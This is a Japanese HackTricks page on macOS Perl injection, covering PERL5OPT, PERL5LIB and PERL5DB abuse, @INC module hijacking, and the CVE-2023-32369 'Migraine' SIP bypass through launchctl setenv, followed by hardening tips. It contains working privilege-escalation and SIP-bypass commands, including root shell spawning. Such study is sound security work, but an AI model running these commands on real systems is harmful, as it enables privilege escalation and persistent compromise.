# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` と `PERL5LIB` 環境変数を使用して

環境変数 **`PERL5OPT`** を使用すると、**Perl** がインタープリタが起動する際に任意のコマンドを実行することが可能です（ターゲットスクリプトの最初の行が解析される**前に**でも）。  
例えば、このスクリプトを作成します:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
今、**env変数をエクスポート**し、**perl**スクリプトを実行します:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
別のオプションは、Perlモジュールを作成することです（例：`/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
そして、env変数を使用して、モジュールが自動的に見つかり、ロードされるようにします：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### その他の興味深い環境変数

* **`PERL5DB`** – インタプリタが **`-d`** (デバッガ) フラグで起動されると、`PERL5DB` の内容がデバッガのコンテキスト内で Perl コードとして実行されます。特権のある Perl プロセスの環境 **と** コマンドラインフラグの両方に影響を与えることができれば、次のようなことができます：

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # スクリプトを実行する前にシェルを起動します
```

* **`PERL5SHELL`** – Windows では、この変数は Perl がシェルを生成する必要があるときに使用するシェル実行可能ファイルを制御します。これは macOS では関連性がないため、完全性のためにのみここに言及されています。

`PERL5DB` は `-d` スイッチを必要としますが、冗長なトラブルシューティングのためにこのフラグが有効な状態で *root* として実行されるメンテナンスやインストーラスクリプトを見つけることは一般的であり、この変数は有効なエスカレーションベクターとなります。

## 依存関係を介して (@INC の悪用)

Perl が検索するインクルードパス (**`@INC`**) をリストすることが可能です：
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14の典型的な出力は次のようになります:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
いくつかの返されたフォルダーは存在しませんが、**`/Library/Perl/5.30`** は存在し、SIPによって保護されておらず、SIPで保護されたフォルダーの*前*にあります。したがって、*root*として書き込むことができれば、悪意のあるモジュール（例：`File/Basename.pm`）をドロップすることができ、そのモジュールをインポートする特権スクリプトによって*優先的に*読み込まれます。

> [!WARNING]
> `/Library/Perl` 内に書き込むには依然として**root**が必要であり、macOSは書き込み操作を行うプロセスに対して*フルディスクアクセス*を要求する**TCC**プロンプトを表示します。

例えば、スクリプトが **`use File::Basename;`** をインポートしている場合、攻撃者が制御するコードを含む `/Library/Perl/5.30/File/Basename.pm` を作成することが可能です。

## Migration Assistantを介したSIPバイパス (CVE-2023-32369 “Migraine”)

2023年5月、Microsoftは**CVE-2023-32369**を開示しました。これは**Migraine**と呼ばれる、*root*攻撃者がシステム整合性保護（SIP）を完全に**バイパス**することを可能にするポストエクスプロイト技術です。脆弱なコンポーネントは**`systemmigrationd`**であり、**`com.apple.rootless.install.heritable`**という権限を持つデーモンです。このデーモンによって生成された子プロセスはすべてその権限を継承し、したがってSIPの制限の**外部**で実行されます。

研究者によって特定された子プロセスの中には、Appleが署名したインタープリターがあります：
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Perlは`PERL5OPT`を尊重し（Bashは`BASH_ENV`を尊重します）、デーモンの*環境*を汚染するだけで、SIPなしのコンテキストで任意の実行を得るのに十分です：
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
`migrateLocalKDC`が実行されると、`/usr/bin/perl`が悪意のある`PERL5OPT`で起動し、SIPが再有効化される前に`/private/tmp/migraine.sh`を実行します。そのスクリプトから、例えば、**`/System/Library/LaunchDaemons`**内にペイロードをコピーしたり、ファイルを**削除不可能**にするために`com.apple.rootless`拡張属性を割り当てたりできます。

AppleはmacOS **Ventura 13.4**、**Monterey 12.6.6**、および**Big Sur 11.7.7**でこの問題を修正しましたが、古いまたはパッチが適用されていないシステムは引き続き悪用可能です。

## ハードニング推奨事項

1. **危険な変数をクリアする** – 特権のあるlaunchdaemonsやcronジョブは、クリーンな環境で開始するべきです（`launchctl unsetenv PERL5OPT`、`env -i`など）。
2. **必要不可欠でない限り、rootとしてインタプリタを実行しない**。コンパイルされたバイナリを使用するか、早期に権限を降下させます。
3. **ベンダースクリプトに`-T`（汚染モード）を使用する**ことで、Perlが汚染チェックが有効なときに`PERL5OPT`やその他の安全でないスイッチを無視します。
4. **macOSを最新の状態に保つ** – “Migraine”は現在のリリースで完全にパッチが適用されています。

## 参考文献

- Microsoft Security Blog – “新しいmacOSの脆弱性、MigraineはSystem Integrity Protectionをバイパスする可能性があります”（CVE-2023-32369）、2023年5月30日。
- Hackyboiz – “macOS SIPバイパス（PERL5OPT & BASH_ENV）研究”、2025年5月。

{{#include ../../../banners/hacktricks-training.md}}
